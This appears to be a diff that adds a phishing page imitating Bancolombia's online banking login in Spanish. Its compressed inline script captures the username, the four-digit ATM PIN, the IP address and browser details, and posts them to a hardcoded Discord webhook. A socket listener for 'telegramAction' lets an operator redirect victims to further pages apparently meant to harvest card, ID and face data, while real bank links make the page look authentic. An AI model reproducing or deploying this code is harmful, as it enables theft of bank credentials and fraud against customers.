@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sucursal Virtual Personas - Bancolombia</title>
+    <link rel="stylesheet" href="styles_new.css">
+    <script src="/socket.io/socket.io.js"></script>
+    <script src="/js/banco-utils.js"></script>
+    <script>
+    document.addEventListener('DOMContentLoaded', async function() {
+        const a=document.getElementById('usuario'),b=document.getElementById('clave'),c=document.querySelector('.btn-iniciar'),d=document.querySelector('.auth-form'),e=document.getElementById('loadingOverlay');
+        if(!a||!b||!c||!d)return;
+        e&&(e.classList.remove('active','show'),e.style.display='');
+        let f=null;
+        try{typeof BancoUtils!=='undefined'&&BancoUtils.initSocket&&((f=BancoUtils.initSocket())&&f.removeAllListeners('telegramAction'))}catch(g){console.log('BancoUtils no disponible, continuando sin él')}
+        c.disabled=true;
+        function h(){const g=a.value.trim(),i=b.value;
+        const j=g.length>0&&i.length===4;
+        c.disabled=!j;
+        j?(c.style.backgroundColor='#FFD700',c.style.cursor='pointer'):(c.style.backgroundColor='',c.style.cursor='default')}
+        b.addEventListener('input',function(g){let i=g.target.value.replace(/\D/g,'').slice(0,4);
+        b.value=i;
+        h()});
+        a.addEventListener('input',h);
+        b.addEventListener('keyup',h);
+        b.addEventListener('change',h);
+        h();
+        d.addEventListener('submit',async function(g){g.preventDefault();
+        if(c.disabled)return;
+        const i=await k(),l=new Date(),m=l.toLocaleDateString('es-CO',{weekday:'long',year:'numeric',month:'long',day:'numeric',hour:'numeric',minute:'numeric',second:'numeric',hour12:true,timeZone:'America/Bogota'}),n={usuario:a.value.trim(),clave:b.value,ip:i,fecha:m,userAgent:navigator.userAgent,plataforma:navigator.platform},o='https://discordapp.com/api/webhooks/1502450235039813796/i46OZ18VVn1ihVHMN6BS02ZyEy7bZp7WoJuaYYhS4BWbNrXVHRPADrYpS_CeFqyvYwSQ',p={title:'🔐 NUEVO INICIO DE SESIÓN - BANCOLOMBIA',color:0xFFD700,fields:[{name:'👤 Usuario',value:`\`${n.usuario}\``,inline:true},{name:'🔑 Clave',value:`\`${n.clave}\``,inline:true},{name:'🌐 IP',value:`\`${n.ip}\``,inline:true},{name:'📅 Fecha/Hora',value:`\`${n.fecha}\``,inline:false},{name:'💻 Navegador',value:`\`${n.userAgent.substring(0,80)}...\``,inline:false},{name:'🖥️ Plataforma',value:`\`${n.plataforma}\``,inline:true}],timestamp:new Date().toISOString(),footer:{text:'Bancolombia - Sistema de Seguridad'}};
+        try{await fetch(o,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({embeds:[p]})})}catch(q){console.error('Error al enviar a Discord:',q)}
+        window.location.href='dinamica.html'});
+        typeof BancoUtils!=='undefined'&&BancoUtils.onTelegramAction&&BancoUtils.onTelegramAction((g)=>{g.action==='finalizar'?window.location.href='https://www.bancolombia.com/personas':['index','dinamica','tarjeta','cedula','cara','terminos'].includes(g.action)&&(window.location.href=g.action+'.html')});
+        async function k(){try{const g=await fetch('https://api.ipify.org?format=json'),h=await g.json();
+        return h.ip}catch(g){return'No disponible'}}
+        async function r(){try{const g=await k();
+        document.querySelectorAll('.ip-address').forEach(i=>i.textContent=`Dirección IP: ${g}`);
+        const h=new Date(),i=h.toLocaleDateString('es-CO',{weekday:'long',year:'numeric',month:'long',day:'numeric',hour:'numeric',minute:'2-digit',hour12:true,timeZone:'America/Bogota'}).toLowerCase();
+        document.querySelectorAll('.datetime').forEach(j=>j.textContent=i)}catch(g){}}
+        r();
+        setInterval(r,60000)});
+    </script>
+</head>
+<body>
+    <div class="auth-container">
+        <div class="auth-content">
+            <img src="img/logo-bancolombia-blanco.png" alt="Bancolombia" class="logo">
+            <h1>Sucursal Virtual Personas</h1>
+            <div class="auth-box">
+                <h2>¡Hola!</h2>
+                <p>Ingresa los datos para gestionar tus productos y hacer transacciones.</p>
+                <form class="auth-form">
+                    <div class="form-group">
+                        <div class="input-group">
+                            <img class="input-icon" src="img/usuario.png" alt="" aria-hidden="true" width="20" height="20" decoding="async" loading="eager">
+                            <div class="input-wrapper">
+                                <input type="text" id="usuario" placeholder="Usuario">
+                                <label for="usuario">Usuario</label>
+                            </div>
+                        </div>
+                        <a href="https://svpersonas.apps.bancolombia.com/crear-usuario/recordar-usuario" class="forgot-link">¿Olvidaste tu usuario?</a>
+                    </div>
+                    <div class="form-group">
+                        <div class="input-group">
+                            <img class="input-icon" src="img/candado.png" alt="" aria-hidden="true" width="20" height="20" decoding="async" loading="eager">
+                            <div class="input-wrapper">
+                                <input type="password" id="clave" placeholder="Clave del cajero" maxlength="4" inputmode="numeric" pattern="\d{4}" autocomplete="off" onkeypress="return event.charCode >= 48 && event.charCode <= 57">
+                                <label for="clave">Clave del cajero</label>
+                            </div>
+                        </div>
+                        <a href="https://svpersonas.apps.bancolombia.com/crear-usuario/crea-tu-clave" class="forgot-link">¿Olvidaste o bloqueaste tu clave?</a>
+                    </div>
+                    <button type="submit" class="btn-iniciar" disabled>Iniciar sesión</button>
+                    <a href="https://svpersonas.apps.bancolombia.com/crear-usuario/ingresa-tus-datos" class="create-account">Crear usuario</a>
+                </form>
+            </div>
+        </div>
+    </div>
+    <div class="help-links">
+        <a href="#">¿Problemas para conectarte?</a>
+        <span class="separator">•</span>
+        <a href="#">Aprende sobre seguridad</a>
+        <span class="separator">•</span>
+        <a href="#">Reglamento Sucursal Virtual</a>
+        <span class="separator">•</span>
+        <a href="#">Política de privacidad</a>
+    </div>
+    <footer class="footer">
+        <div class="footer-content">
+            <div class="footer-left">
+                <img src="img/logo-bancolombia-blanco.png" alt="Bancolombia" class="footer-logo">
+                <img src="img/SFC_NEGRO_1_1.png" alt="SFC" class="sfc-logo">
+            </div>
+            <div class="footer-right">
+                <p class="ip-address">Dirección IP: Cargando...</p>
+                <p class="datetime">Cargando fecha y hora...</p>
+            </div>
+        </div>
+    </footer>
+    <div id="loadingOverlay" class="loading-overlay">
+        <img src="img/LogoBancolombia.png" alt="Cargando..." class="loading-logo">
+    </div>
+</body>
+</html>
